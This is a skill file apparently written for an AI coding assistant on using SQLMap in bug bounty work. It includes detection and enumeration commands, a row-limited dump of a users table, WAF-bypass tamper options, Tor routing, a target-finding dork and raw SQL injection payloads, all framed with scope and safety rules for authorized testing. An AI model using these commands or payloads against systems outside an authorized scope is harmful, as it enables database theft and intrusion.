---
name: bug-bounty-sqlmap
description: >
  SQLMap advanced usage for bug bounty hunting. SQL injection detection,
  exploitation, and data extraction with safe boundaries.
  Trigger: When user says "sqlmap", "sqli", "sql injection", "enumerate database".
license: Apache-2.0
metadata:
  author: gentleman-programming
  version: "1.0"
---

## When to Use

- User says "sqlmap", "sqli", "sql injection", "test for SQLi"
- Finding potential SQL injection during testing
- Need to enumerate database after confirming SQLi
- Extracting data from vulnerable endpoint
- Verifying SQLi as false positive or confirmed

## Critical Patterns

### Important Warnings

⚠️ **BUG BOUNTY RULES**:
- Always use `--batch` to avoid interactive prompts
- Use `--risk=2` MAX (never `--risk=3` — may drop tables)
- Never use `--drop-schema` or destructive options
- Always limit output with `--start` and `--stop` for large tables
- Check program rules before using time-based injections

### Safe SQLi Testing Workflow

**Step 1: Detect SQLi (Read-Only)**

```bash
# Basic detection with request file
sqlmap -r request.txt --batch --level=2

# With cookies
sqlmap -r request.txt --cookie="session=abc123" --batch

# With JSON body
sqlmap -r request.txt --data='{"id":1}' --batch
```

**Step 2: Confirm and Enumerate (Read-Only)**

```bash
# Confirm injection point
sqlmap -r request.txt --batch --dbs

# List tables in database
sqlmap -r request.txt --batch -D target_db --tables

# List columns in table
sqlmap -r request.txt --batch -D target_db -T users --columns

# Dump data (LIMITED)
sqlmap -r request.txt --batch -D target_db -T users --dump --start=1 --stop=10

# Current user/database
sqlmap -r request.txt --batch --current-user --current-db
```

### HTTP Request File Format

```
POST /search HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

q=test
```

### Quick Testing (URL mode)

```bash
# Simple GET parameter
sqlmap "http://target.com/product?id=1" --batch

# WithUA and cookies
sqlmap "http://target.com/search?q=test" --cookie="PHPSESSID=abc" --batch

# POST request
sqlmap "http://target.com/login" --data="username=admin&password=test" --batch
```

### Advanced Options for Bug Bounty

```bash
# Google dork for SQLi targets (program-approved)
sqlmap -g "site:target.com inurl:php?id=" --batch

# Use Tor for anonymity (if allowed)
sqlmap -r request.txt --tor --tor-port=9050 --check-tor

# Tamper scripts (bypass WAF)
sqlmap -r request.txt --batch --tamper=space2comment,between

# Extract only database version and current user (safe)
sqlmap -r request.txt --batch --banner --current-user

# Time-based blind (use sparingly)
sqlmap -r request.txt --batch --technique=T --time-sec=10
```

## Commands Reference

| Command | Purpose | Safety |
|---------|---------|--------|
| `sqlmap -r req.txt --batch` | Basic scan | ✅ Safe |
| `sqlmap -r req.txt --batch --dbs` | List databases | ✅ Safe |
| `sqlmap -r req.txt --batch -D db --tables` | List tables | ✅ Safe |
| `sqlmap -r req.txt --batch -D db -T tbl --dump` | Dump data | ⚠️ Limit rows |
| `sqlmap -r req.txt --batch --os-shell` | OS shell | ❌ NEVER |
| `sqlmap -r req.txt --sql-shell` | SQL shell | ⚠️ Read-only prefer |
| `sqlmap -r req.txt --risk=3` | Max risk | ❌ NEVER in bug bounty |

## Common Payloads

### Boolean-based Blind

```
' AND 1=1 --
' AND 1=2 --
```

### Union-based

```
' UNION SELECT NULL--
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
```

### Time-based

```
' AND SLEEP(5)--
' AND (SELECT * FROM (SELECT SLEEP(5))a)--
```

### Stacked (MSSQL, Postgres)

```
'; SELECT * FROM users--
```

## False Positive Detection

Before running sqlmap, verify manually:

```bash
# Confirm with single quote (error-based)
curl "http://target.com/product?id=1'"

# Look for SQL error messages
curl "http://target.com/product?id=1'" | grep -iE "sql|mysql|postgresql|oracle|error|syntax"

# If error appears → proceed with sqlmap
# If no error → likely not injectable
```

## Checklist Before Using SQLMap

- [ ] Target is in scope (verify domain/IP)
- [ ] Program allows SQLi testing (check rules)
- [ ] Manual test confirms injection point (single quote causes error)
- [ ] Request saved to file (-r option)
- [ ] Using `--batch` to avoid prompts
- [ ] NOT using `--risk=3` or `--drop-schema`
- [ ] Will limit data extraction with `--start`/`--stop`

## Resources

- **Official Docs**: https://github.com/sqlmapproject/sqlmap/wiki
- **Payloads**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- **WAF Bypass**: https://github.com/sqlmapproject/sqlmap/wiki/Usage#tamper-scripts